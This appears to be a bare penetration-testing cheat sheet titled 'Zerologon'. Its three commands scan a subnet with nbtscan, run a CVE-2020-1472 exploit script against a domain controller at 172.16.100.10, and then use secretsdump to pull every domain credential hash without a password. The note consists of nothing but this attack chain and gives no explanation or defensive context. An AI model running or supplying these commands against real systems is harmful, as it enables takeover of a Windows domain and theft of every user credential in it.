### Zerologon
```
nbtscan -r 172.16.100.0/24
python3 cve-2020-1472-exploit.py -n ELASTIC -t 172.16.100.10 
python3 secretsdump.py -no-pass -just-dc elastic.me/ELASTIC@172.16.100.10
```
